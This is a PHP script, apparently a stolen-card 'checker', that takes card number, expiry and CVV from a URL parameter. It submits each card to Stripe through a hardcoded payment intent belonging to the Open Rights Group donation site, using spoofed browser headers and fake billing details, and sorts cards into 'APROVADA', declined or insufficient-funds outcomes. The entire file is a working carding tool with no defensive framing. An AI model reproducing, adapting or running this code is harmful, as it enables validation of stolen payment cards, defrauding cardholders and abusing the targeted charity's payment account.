<?php
error_reporting(0);
ignore_user_abort(true);


// --- Configurações ---
define('SITE_URL', 'https://action.openrightsgroup.org');
define('STRIPE_PUBLIC_KEY', 'pk_live_aNTEFiHgPSMA50yyPflmSFL5');
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0');
define('TAG', '@cybersecofc');


if (!isset($_GET['lista']) || empty($_GET['lista'])) {
    die("ERRO: Lista não fornecida");
}

$lista = $_GET['lista'];
$lista = str_replace(" ", "|", $lista);
$lista = str_replace("%20", "|", $lista);
$separar = explode("|", $lista);

if (count($separar) < 4) {
    die("ERRO: Formato inválido");
}

$cc = trim(preg_replace('/[^0-9]/', '', $separar[0]));
$mes = trim($separar[1]);
$ano = trim($separar[2]);
$cvv = trim(preg_replace('/[^0-9]/', '', $separar[3]));

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}

// Detectar bandeira
$last4 = substr($cc, -4);
$primeiro_digito = substr($cc, 0, 1);
$primeiros_2 = substr($cc, 0, 2);
$primeiros_3 = substr($cc, 0, 3);
$primeiros_4 = substr($cc, 0, 4);
$brand = 'DESCONHECIDA';

if ($primeiro_digito == '4') {
    $brand = 'VISA';
} elseif ($primeiro_digito == '5') {
    $brand = 'MASTERCARD';
} elseif ($primeiro_digito == '3') {
    if ($primeiros_2 == '34' || $primeiros_2 == '37') {
        $brand = 'AMEX';
    } elseif ($primeiros_2 == '36' || $primeiros_2 == '38' || $primeiros_3 == '300' || $primeiros_3 == '301' || $primeiros_3 == '302' || $primeiros_3 == '303' || $primeiros_3 == '304' || $primeiros_3 == '305') {
        $brand = 'DINERS';
    } else {
        $brand = 'JCB';
    }
} elseif ($primeiro_digito == '6') {
    if ($primeiros_4 == '6011' || $primeiros_3 == '644' || $primeiros_3 == '645' || $primeiros_3 == '646' || $primeiros_3 == '647' || $primeiros_3 == '648' || $primeiros_3 == '649' || $primeiros_2 == '65') {
        $brand = 'DISCOVER';
    } else {
        $brand = 'RUPAY';
    }
} elseif ($primeiros_2 == '50' || $primeiros_2 == '60' || $primeiros_2 == '67') {
    $brand = 'ELO';
}

$cartao_formatado = "$cc|$mes|" . substr($ano, -2) . "|$cvv";


$clientSessionId = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    mt_rand(0, 0xffff), mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0x0fff) | 0x4000,
    mt_rand(0, 0x3fff) | 0x8000,
    mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
);


$tempo_inicial = microtime(true);


$ch_site = curl_init();

curl_setopt_array($ch_site, [
    CURLOPT_URL => SITE_URL . '/make-one-donation',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HEADER => true,
    CURLOPT_USERAGENT => USER_AGENT,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_COOKIEJAR => __DIR__ . '/cookies.txt',
    CURLOPT_COOKIEFILE => __DIR__ . '/cookies.txt',
]);

$site_response = curl_exec($ch_site);
$http_site = curl_getinfo($ch_site, CURLINFO_HTTP_CODE);
curl_close($ch_site);

if ($http_site != 200) {
    $tempo_total = round(microtime(true) - $tempo_inicial, 2);
    $saida = "$cartao_formatado - ERRO NO SITE (HTTP $http_site) ($brand) - Final $last4 ({$tempo_total}s) " . TAG;
    echo $saida;
    exit();
}


$payment_intent_id = 'pi_3T0lmTI2eVMKgXRt0ChAuT9w';
$client_secret = 'pi_3T0lmTI2eVMKgXRt0ChAuT9w_secret_Rc0Wc2tuVhM0cncft1Vircx33';


$url_confirm = 'https://api.stripe.com/v1/payment_intents/' . $payment_intent_id . '/confirm';


$confirm_data = [
    'payment_method_data[type]' => 'card',
    'payment_method_data[billing_details][name]' => 'flaky',
    'payment_method_data[billing_details][email]' => 'cybesr@gmail.com',
    'payment_method_data[card][number]' => $cc,
    'payment_method_data[card][cvc]' => $cvv,
    'payment_method_data[card][exp_month]' => $mes,
    'payment_method_data[card][exp_year]' => substr($ano, -2),
    'payment_method_data[guid]' => 'NA',
    'payment_method_data[muid]' => 'NA',
    'payment_method_data[sid]' => 'NA',
    'payment_method_data[pasted_fields]' => 'number',
    'payment_method_data[payment_user_agent]' => 'stripe.js/d68d8e2c5f; stripe-js-v3/d68d8e2c5f; split-card-element',
    'payment_method_data[referrer]' => SITE_URL,
    'payment_method_data[time_on_page]' => rand(10000, 60000),
    'payment_method_data[client_attribution_metadata][client_session_id]' => $clientSessionId,
    'payment_method_data[client_attribution_metadata][merchant_integration_source]' => 'elements',
    'payment_method_data[client_attribution_metadata][merchant_integration_subtype]' => 'split-card-element',
    'payment_method_data[client_attribution_metadata][merchant_integration_version]' => '2017',
    'expected_payment_method_type' => 'card',
    'use_stripe_sdk' => 'true',
    'key' => STRIPE_PUBLIC_KEY,
    'client_attribution_metadata[client_session_id]' => $clientSessionId,
    'client_attribution_metadata[merchant_integration_source]' => 'elements',
    'client_attribution_metadata[merchant_integration_subtype]' => 'split-card-element',
    'client_attribution_metadata[merchant_integration_version]' => '2017',
    'client_secret' => $client_secret
];

$confirm_fields = http_build_query($confirm_data, '', '&', PHP_QUERY_RFC3986);

$ch_confirm = curl_init();
curl_setopt_array($ch_confirm, [
    CURLOPT_URL => $url_confirm,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => [
        'Accept: application/json',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/',
        'User-Agent: ' . USER_AGENT,
        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
    ],
    CURLOPT_POSTFIELDS => $confirm_fields,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_ENCODING => 'gzip, deflate',
    CURLOPT_COOKIEJAR => __DIR__ . '/cookies.txt',
    CURLOPT_COOKIEFILE => __DIR__ . '/cookies.txt',
]);

$response_confirm = curl_exec($ch_confirm);
$http_confirm = curl_getinfo($ch_confirm, CURLINFO_HTTP_CODE);
$curl_error2 = curl_error($ch_confirm);
curl_close($ch_confirm);

$tempo_final = microtime(true);
$tempo_total = round($tempo_final - $tempo_inicial, 2);


$result_message = '';

if ($curl_error2) {
    $result_message = "ERRO CURL: $curl_error2";
} elseif ($response_confirm) {
    $data = json_decode($response_confirm, true);
    
    
    if (isset($_GET['debug'])) {
        echo "<pre>";
        print_r($data);
        echo "</pre>";
    }
    
    
    if (isset($data['error'])) {
        $error = $data['error'];
        $message = $error['message'] ?? '';
        $decline_code = $error['decline_code'] ?? '';
        $code = $error['code'] ?? '';
        
        if (!empty($decline_code)) {
            $result_message = strtoupper($decline_code);
        } elseif (!empty($code)) {
            $result_message = strtoupper($code);
        } elseif (!empty($message)) {
            
            $clean = preg_replace('/^.*?: /', '', $message);
            $clean = explode('.', $clean)[0];
            $clean = explode(';', $clean)[0];
            $result_message = trim($clean);
            
            $result_message = str_replace([
                'Your card was declined',
                'Your card has insufficient funds',
                'Your card\'s security code is incorrect',
                'Your card is expired',
                'Your card number is incorrect',
                'This integration surface is unsupported for publishable key tokenization',
            ], [
                'DECLINED',
                'INSUFFICIENT_FUNDS',
                'INCORRECT_CVC',
                'EXPIRED_CARD',
                'INCORRECT_NUMBER',
                'UNSUPPORTED_CARD',
            ], $result_message);
        }
    } 
   
    elseif (isset($data['status'])) {
        $status = $data['status'];
        if ($status == 'succeeded') {
            $result_message = 'APROVADA';
        } elseif ($status == 'requires_confirmation') {
            $result_message = 'REQUER CONFIRMAÇÃO';
        } elseif ($status == 'requires_action') {
            $result_message = 'REQUER 3DS';
        } elseif ($status == 'processing') {
            $result_message = 'PROCESSANDO';
        } else {
            $result_message = strtoupper($status);
        }
    }
}


if (empty($result_message)) {
    if ($http_confirm == 200) {
        $result_message = "RESPOSTA INVÁLIDA";
    } else {
        $result_message = "HTTP $http_confirm";
    }
}


$saida = "$cartao_formatado - $result_message ($brand) - Final $last4 ({$tempo_total}s) " . TAG;

echo $saida;

?>
